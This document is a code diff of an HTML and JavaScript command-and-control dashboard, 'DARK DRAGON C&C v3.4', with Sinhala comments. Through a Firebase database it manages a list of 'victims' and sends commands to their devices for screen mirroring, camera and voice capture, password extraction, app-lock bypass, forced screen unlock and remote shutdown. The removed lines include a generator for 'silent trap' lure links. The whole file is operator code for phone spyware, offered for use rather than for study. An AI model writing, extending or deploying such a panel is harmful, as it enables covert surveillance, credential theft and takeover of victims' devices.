@@ -2,32 +2,33 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | ULTIMATE C&C v3.3</title>
+    <title>DARK DRAGON | ULTIMATE C&C v3.4</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon-red: #ff0000; --dark-red: #440000; --bg: #050000; --cyan: #00ffff; --gold: #ffd700; --green: #00ff00; }
+        :root { --neon-red: #ff0000; --dark-red: #440000; --bg: #050000; --cyan: #00ffff; --gold: #ffd700; --green: #00ff00; --purple: #a020f0; }
         body { background: var(--bg); color: var(--neon-red); font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
         #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
         #login-box { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border: 2px solid var(--neon-red); padding: 40px; text-align: center; background: black; z-index: 10000; box-shadow: 0 0 30px var(--dark-red); }
         input { background: #110000; border: 1px solid var(--neon-red); color: var(--neon-red); padding: 12px; margin: 10px 0; width: 280px; outline: none; }
-        button { background: var(--neon-red); color: #000; border: none; padding: 10px 15px; font-weight: bold; cursor: pointer; margin: 5px; font-size: 10px; border-radius: 3px; }
+        button { background: var(--neon-red); color: #000; border: none; padding: 10px 15px; font-weight: bold; cursor: pointer; margin: 5px; font-size: 10px; border-radius: 3px; text-transform: uppercase; }
         button:hover { background: white; }
         #dashboard { display: none; }
         header { border-bottom: 2px solid var(--neon-red); padding: 10px; text-align: center; background: #110000; }
         .target-status { background: #1a0000; color: var(--green); padding: 5px; font-size: 11px; border-bottom: 1px solid var(--neon-red); text-align: center; border-top: 1px solid var(--dark-red); }
         .tabs { display: flex; flex-wrap: wrap; background: #0a0000; border-bottom: 1px solid var(--neon-red); }
-        .tab { padding: 10px 5px; cursor: pointer; border-right: 1px solid var(--dark-red); flex: 1; text-align: center; font-size: 9px; text-transform: uppercase; }
+        .tab { padding: 10px 5px; cursor: pointer; border-right: 1px solid var(--dark-red); flex: 1; text-align: center; font-size: 9px; }
         .tab.active { background: var(--neon-red); color: #000; font-weight: bold; }
         .container { padding: 15px; }
         .panel { display: none; border: 1px solid var(--dark-red); padding: 20px; background: rgba(15, 0, 0, 0.93); min-height: 500px; }
         .panel.active { display: block; }
-        .data-card { border: 1px solid var(--dark-red); background: #000; padding: 15px; margin-bottom: 15px; position: relative; }
+        .data-card { border: 1px solid var(--dark-red); background: #000; padding: 15px; margin-bottom: 15px; }
         table { width: 100%; border-collapse: collapse; font-size: 11px; }
         th, td { border: 1px solid var(--dark-red); padding: 8px; text-align: left; }
+        .live-window { width: 100%; height: 350px; background: #000; border: 2px dashed var(--neon-red); display: flex; align-items: center; justify-content: center; color: var(--cyan); font-weight: bold; }
         .btn-select { background: var(--green); color: black; }
-        .btn-remove { background: #550000; color: white; border: 1px solid red; }
-        .btn-remove:hover { background: red; }
+        .btn-remove { background: #550000; color: white; }
+        .btn-unlock { background: var(--purple) !important; color: white !important; box-shadow: 0 0 10px var(--purple); }
     </style>
 </head>
 <body>
@@ -47,40 +48,34 @@
 
     <div class="tabs">
         <div class="tab active" onclick="showTab(event, 'radar')">🛰️ RADAR</div>
-        <div class="tab" onclick="showTab(event, 'cat-injector')">🐈 TRAP</div>
         <div class="tab" onclick="showTab(event, 'victims')">👥 VICTIMS</div>
+        <div class="tab" onclick="showTab(event, 'screen')">📺 SCREEN</div>
         <div class="tab" onclick="showTab(event, 'camera')">📸 CAM</div>
         <div class="tab" onclick="showTab(event, 'voice')">🎤 VOICE</div>
-        <div class="tab" onclick="showTab(event, 'gallery')">🖼️ GALLERY</div>
-        <div class="tab" onclick="showTab(event, 'passwords')">🔑 PASS</div>
         <div class="tab" onclick="showTab(event, 'unlocked')">🔓 UNLOCKER</div>
         <div class="tab" onclick="showTab(event, 'control')">📱 CONTROL</div>
     </div>
 
     <div class="container">
-        <div id="radar" class="panel active"><h2>SCANNING NODES...</h2><p>Radar active. Monitoring incoming victim signals.</p></div>
-
-        <div id="cat-injector" class="panel">
-            <h2>GENERATE SILENT TRAP</h2>
-            <input type="text" id="target-id-input" placeholder="Victim Name">
-            <button onclick="generateCatLink()">GENERATE</button>
-            <p id="link-result" style="color:var(--cyan); font-size: 12px;"></p>
-        </div>
+        <div id="radar" class="panel active"><h2>SCANNING NODES...</h2><p>Monitoring incoming victim signals.</p></div>
 
         <div id="victims" class="panel">
             <h2>LIVE VICTIM LOGS</h2>
             <table>
                 <thead>
-                    <tr>
-                        <th>Name</th>
-                        <th>Device</th>
-                        <th>Time</th>
-                        <th>Status</th>
-                        <th>Purge</th>
-                    </tr>
+                    <tr><th>Name</th><th>Device</th><th>Time</th><th>Status</th><th>Purge</th></tr>
                 </thead>
                 <tbody id="victim-list"></tbody>
             </table>
+        </div>
+
+        <div id="screen" class="panel">
+            <h2>LIVE SCREEN MIRRORING</h2>
+            <div class="live-window" id="screen-viewer">[ WAITING FOR STREAM... ]</div>
+            <br>
+            <button onclick="sendCommand('start_screen')">START MIRRORING</button>
+            <button onclick="sendCommand('stop_screen')" style="background:#550000; color:white;">STOP STREAM</button>
+            <button onclick="sendCommand('take_screenshot')">TAKE SCREENSHOT</button>
         </div>
 
         <div id="camera" class="panel">
@@ -96,38 +91,27 @@
             <button onclick="sendCommand('start_record')">START RECORDING</button>
         </div>
 
-        <div id="gallery" class="panel">
-            <h2>GALLERY FILE ACCESS</h2>
-            <div id="gallery-files" class="data-card">Waiting for file list...</div>
-            <button onclick="sendCommand('fetch_gallery')">REFRESH FILES</button>
-        </div>
-
-        <div id="passwords" class="panel">
-            <h2>SAVED DATA & PASSWORDS</h2>
-            <div class="data-card" id="pass-list" style="color:var(--gold);">Waiting for extraction...</div>
-            <button onclick="sendCommand('get_passwords')">EXTRACT ALL</button>
-        </div>
-
         <div id="unlocked" class="panel">
             <h2>🔓 UNLOCKED SYSTEM PROTOCOLS</h2>
             <div class="data-card">
-                <h3>SECURITY BYPASS</h3>
-                <button style="background:var(--green); color:black;" onclick="sendCommand('bypass_lock')">BYPASS APP LOCK</button>
-                <button style="background:var(--green); color:black;" onclick="sendCommand('disable_admin')">DISABLE ADMIN</button>
+                <h3>DEVICE LOCK OVERRIDE</h3>
+                <p style="font-size: 10px; color: var(--gold);">භාවිතා කරන්න: වික්ටිම්ගේ Screen එක ලොක් වී ඇති අවස්ථාවකදී.</p>
+                <button class="btn-unlock" onclick="sendCommand('force_unlock')">FORCE UNLOCK SCREEN</button>
+                <button class="btn-unlock" onclick="sendCommand('keep_awake')">KEEP SCREEN AWAKE</button>
             </div>
             <div class="data-card">
-                <h3>SYSTEM ACCESS</h3>
-                <button onclick="sendCommand('get_contacts')">CONTACTS</button>
-                <button onclick="sendCommand('get_messages')">SMS</button>
-                <button onclick="sendCommand('get_history')">HISTORY</button>
+                <h3>SECURITY BYPASS</h3>
+                <button style="background:var(--green); color:black;" onclick="sendCommand('bypass_lock')">BYPASS APP LOCK</button>
+                <button onclick="sendCommand('get_passwords')">EXTRACT PASSWORDS</button>
             </div>
         </div>
 
         <div id="control" class="panel">
             <h2>REMOTE SYSTEM CONTROL</h2>
             <button onclick="sendCommand('restart')" style="background:orange">RESTART</button>
-            <button onclick="sendCommand('shutdown')" style="background:red; color:white">OFF</button>
-            <button onclick="sendCommand('reset')" style="background:yellow">FACTORY RESET</button>
+            <button onclick="sendCommand('shutdown')" style="background:red; color:white">POWER OFF</button>
+            <button onclick="sendCommand('vibrate')">VIBRATE DEVICE</button>
+            <button onclick="sendCommand('lock_device')" style="background:#330000; color:white;">LOCK DEVICE</button>
         </div>
     </div>
 </div>
@@ -146,12 +130,6 @@
             document.getElementById('dashboard').style.display = 'block';
             loadVictims();
         } else { alert("ACCESS DENIED"); }
-    }
-
-    function generateCatLink() {
-        const target = document.getElementById('target-id-input').value;
-        const baseURL = window.location.href.substring(0, window.location.href.lastIndexOf("/") + 1);
-        document.getElementById('link-result').innerText = baseURL + "cat_trap.html?t=" + btoa(target);
     }
 
     function loadVictims() {
@@ -175,29 +153,24 @@
     function selectTarget(key, name) {
         window.activeTarget = key;
         document.getElementById('active-target-display').innerText = name;
-        alert("Target [" + name + "] Locked!");
+        alert("Target [" + name + "] Locked! Systems Ready.");
     }
 
-    // --- පිරිසිදු කිරීමේ Function එක ---
     function removeVictim(key) {
-        if(confirm("මෙම Victim ව සම්පූර්ණයෙන්ම අයින් කරන්නද?")) {
-            // Database එකෙන් අයින් කරනවා
+        if(confirm("මෙම Victim ව අයින් කරන්නද?")) {
             db.ref('victims/' + key).remove();
             db.ref('commands/' + key).remove();
-            
-            // දැනට Select වෙලා හිටපු කෙනාම නම් අයින් කරන්නේ, Locked Display එක Reset කරනවා
             if(window.activeTarget === key) {
                 window.activeTarget = null;
                 document.getElementById('active-target-display').innerText = "NONE";
             }
-            alert("Victim Purged!");
         }
     }
 
     function sendCommand(cmd) {
-        if(!window.activeTarget) return alert("Victim කෙනෙක්ව SELECT කරලා හිටපන්!");
+        if(!window.activeTarget) return alert("Victim කෙනෙක්ව SELECT කරන්න!");
         db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now() });
-        alert("Protocol Sent: " + cmd);
+        alert("Command Sent: " + cmd);
     }
 
     function showTab(evt, id) {
@@ -207,7 +180,7 @@
         if(evt) evt.currentTarget.classList.add('active');
     }
 
-    // Matrix Rain Effect
+    // Matrix Effect
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
